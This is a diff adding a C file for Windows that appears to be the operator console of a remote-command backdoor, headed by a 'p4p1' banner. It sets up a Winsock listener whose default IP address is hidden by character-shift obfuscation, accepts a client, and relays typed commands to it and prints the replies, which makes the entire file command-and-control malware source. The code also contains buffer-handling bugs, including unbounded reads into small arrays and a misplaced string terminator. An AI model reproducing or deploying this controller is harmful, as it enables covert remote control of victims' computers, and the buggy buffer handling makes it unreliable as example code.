@@ -1,0 +1,171 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <winsock2.h>
+#include <windows.h>
+
+#define BUFSIZE 9999
+
+char decr(char ch)
+{
+	return ch-1;
+}
+
+int main(int argc, char *argv[])
+{
+
+	int portno;
+	char ip[16];
+	char ipchar[16];
+	char portchar[6];
+
+	FILE * fp = fopen("port.cfg", "r");
+	FILE * fip = fopen("ip.cfg", "r");
+
+	if(fp == NULL){
+		portno = 44441;      //If no file set up default port to prevent errors
+	} else {
+		int i = 0;
+		char c;
+		while( (c = fgetc(fp)) != EOF){     // Get char from file while not at EOF
+			portchar[i] = c;
+			i++;
+		}
+		portchar[i+1] = '\0';               //Terminate string
+
+		portno = atoi(portchar);            //Set up custom port
+		fclose(fp);
+	}
+
+	if(fip == NULL){
+		char ipjib[14] = "2:3/279/2/28";
+		char corip[14];
+
+		int i;
+
+		for(i = 0; i < strlen(ipjib); i++){
+			char ch;
+			ch = ipjib[i];
+			corip[i] = decr(ch);
+		}
+
+		strcpy(ip, corip);
+	      //If no file set up default ip to prevent errors
+	} else {
+		int i = 0;
+		char c;
+		while( (c = fgetc(fip)) != EOF){     // Get char from file while not at EOF
+			ipchar[i] = c;
+			i++;
+		}
+		ipchar[i] = '\0';
+
+		strcpy(ip, ipchar);
+
+		fclose(fip);
+	}
+
+	printf("       _ _       _\n  _ __| | | _ __/ |\n | '_ \\_  _| '_ \\ |\n | .__/ |_|| .__/_|\n |_|       |_|\n");
+	printf("[*] Setting up winsock\n");
+	WSADATA wsa;
+	if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0){
+		printf("[!] Server : The winsock dll was not found!\n");
+		getchar();
+		return 0;
+	}
+
+	printf("[*] Creating socket");
+	/*Create socket*/
+	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if( s == INVALID_SOCKET){
+		printf("[!] Server : Error at socket(): %ld\n", WSAGetLastError());
+		WSACleanup();
+		getchar();
+		return 0;
+	}
+
+	struct sockaddr_in server;
+	server.sin_family = AF_INET;
+	server.sin_addr.s_addr = inet_addr(ip);
+	server.sin_port = htons(portno);
+
+	printf("[*] Binding");
+	/*bind*/
+	if(bind(s, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR){
+		printf("[!] Server : bind Failed : %ld.\n", WSAGetLastError());
+		getchar();
+		closesocket(s);
+		return 0;
+	}
+
+	printf("[*] Listening on %s:%d", ip, portno);
+	/*listen*/
+	if(listen(s, 10) == SOCKET_ERROR){
+		printf("[!]Server:listen():Error listening to socket %ld.\n", WSAGetLastError());
+		getchar();
+	}
+
+	/*Accept*/
+	SOCKET as;
+
+	printf("[*] waiting for client to connect\n");
+
+	while(1){
+		as = SOCKET_ERROR;
+		while(as == SOCKET_ERROR){
+			as = accept(s, NULL, NULL);
+		}
+		printf("[*] Server : Client Connected!\n");
+		s = as;
+		break;
+	}
+
+	/* Declare Variables */
+	int bytesSent;
+	int bytesRecv;
+	char buf[BUFSIZE];
+
+	/* pointer to variables to make syntacs faster */
+	int * pbr = &bytesRecv;
+	int * pbs = &bytesSent;
+
+	*pbr = SOCKET_ERROR;
+
+	strcpy(buf, "1");
+
+	printf("[*] Send Client ID.");
+	*pbs = send(s, buf, strlen(buf), 0);
+	if( *pbs == SOCKET_ERROR ){
+		printf("[!] Server : send error %ld.\n", WSAGetLastError());
+	}
+
+	while(1){
+
+		memset(buf, 0, BUFSIZE);
+		printf("<p4p1 -%d- />", s);
+		fgets(buf, BUFSIZE, stdin);
+		if( buf[0] == '&' ){
+			*pbs = send(s, buf, strlen(buf), 0);
+			if( *pbs == SOCKET_ERROR){
+				printf("[!] Server: send bug, wait for client to restart.\n");
+			}
+			goto close;
+		} else {
+			*pbs = send(s, buf, strlen(buf), 0);
+		        if( *pbs == SOCKET_ERROR ){
+		                printf("[!] Server : send error %ld.\n", WSAGetLastError());
+		        }
+
+			memset(buf, 0, BUFSIZE);
+
+			*pbr = recv(s, buf, BUFSIZE, 0);
+			if( *pbr == SOCKET_ERROR ){
+				printf("[!] Server : recv error %ld.\n", WSAGetLastError());
+			}
+		}
+	}
+
+	close:
+	WSACleanup();
+	return 0;
+}
